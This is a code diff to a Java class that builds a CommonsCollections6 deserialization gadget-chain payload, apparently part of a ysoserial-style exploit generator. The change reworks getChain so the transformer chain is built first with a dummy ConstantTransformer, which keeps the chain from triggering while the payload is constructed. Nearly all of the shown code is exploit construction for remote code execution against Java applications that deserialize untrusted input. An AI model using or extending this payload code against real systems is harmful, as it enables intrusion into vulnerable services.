@@ -10,6 +10,7 @@ import com.ppp.sinks.annotation.Sink;
 import com.ppp.utils.Reflections;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
@@ -33,13 +34,14 @@ public class CommonsCollections6 implements ObjectPayload<Object> {
         // sink
         Object sinkObject = SinkScheduler.builder(sinksHelper);
 
-        Object kickOffObject = getChain((Transformer[]) sinkObject);
+        Object kickOffObject = getChain(sinkObject);
 
         return kickOffObject;
     }
 
-    public Object getChain(Transformer[] transformers) throws Exception {
-        Transformer transformerChain = new ChainedTransformer(transformers);
+    public Object getChain(Object transformers) throws Exception {
+        final Transformer transformerChain = new ChainedTransformer(
+                new Transformer[]{new ConstantTransformer(1)});
 
         final Map innerMap = new HashMap();
         final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
